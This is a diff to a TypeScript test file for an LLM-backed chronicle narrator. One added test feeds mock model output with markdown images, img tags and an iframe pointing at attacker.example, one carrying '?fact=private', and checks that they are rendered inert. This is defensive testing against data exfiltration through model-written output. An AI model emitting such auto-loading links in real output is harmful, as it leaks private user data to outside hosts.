@@ -112,6 +112,54 @@ describe("narrateChronicle", () => {
     );
   });
 
+  it("rejects an unsourced blog seed", async () => {
+    const llm = client(
+      JSON.stringify({
+        headline: "Plausible prose.",
+        narrative_md: "A narrative that otherwise passes schema validation.",
+        blog_seeds: [
+          {
+            title: "No evidence pointer",
+            angle: "This seed has no source",
+            sources: [],
+          },
+        ],
+      }),
+    );
+
+    await expect(narrateChronicle(facts(), llm)).resolves.toEqual(
+      expect.objectContaining({ status: "failed", narrative: null, error: "malformed_output" }),
+    );
+  });
+
+  it("makes model-authored embeds and raw HTML passive while preserving ordinary links", async () => {
+    const llm = client(
+      JSON.stringify({
+        headline: '<img src="https://attacker.example/headline">',
+        narrative_md:
+          "![leak](https://attacker.example/?fact=private) <iframe src=https://attacker.example></iframe> [read more](https://example.com)",
+        blog_seeds: [
+          {
+            title: "An inert seed",
+            angle: "![pixel](https://attacker.example/pixel)",
+            sources: ["mem-1"],
+          },
+        ],
+      }),
+    );
+
+    const result = await narrateChronicle(facts(), llm);
+    const rendered = JSON.stringify(result.narrative);
+
+    expect(result.status).toBe("generated");
+    expect(rendered).not.toContain("![");
+    expect(rendered).not.toContain("<img");
+    expect(rendered).not.toContain("<iframe");
+    expect(result.narrative?.narrativeMd).toContain("[read more](https://example.com)");
+    expect(result.narrative?.narrativeMd).toContain("&#33;[leak]");
+    expect(result.narrative?.headline).toContain("&lt;img");
+  });
+
   it("fails soft when the provider call throws", async () => {
     const llm: LlmClient = {
       complete: vi.fn().mockRejectedValue(new Error("provider unavailable")),
